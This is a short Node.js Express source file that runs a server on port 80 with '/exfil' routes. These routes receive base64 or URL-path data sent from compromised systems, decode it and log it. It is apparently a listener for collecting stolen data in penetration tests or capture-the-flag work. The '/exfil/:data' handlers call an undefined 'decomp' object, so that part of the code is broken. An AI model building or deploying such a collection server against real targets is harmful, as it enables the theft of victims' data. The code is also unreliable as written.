var express = require("express");
var app = express();
app.use(express.json());
app.use(express.text());
app.get("/", (req, res) => {
    console.log("Simple GET request received");
    res.send("I'm here");
});
app.post("/exfil", (req, res) => {
    console.log("BASE64: ", req.body);
    console.log("DATA: ", Buffer.from(req.body, 'base64').toString());
    res.json({"message": "SUCCESS"});
});
app.get("/exfil/:data", (req, res) => {
    console.log(req.params.data);
    decomp.decode(req.params.data);
    res.json({"message":"SUCCESS"});
});
app.post("/exfil/:data", (req, res) => {
    console.log(req.params.data);
    decomp.decode(req.params.data);
    res.json({"message":"SUCCESS"});
});
app.listen(80, () => {
 console.log("Server running on port 80");
});
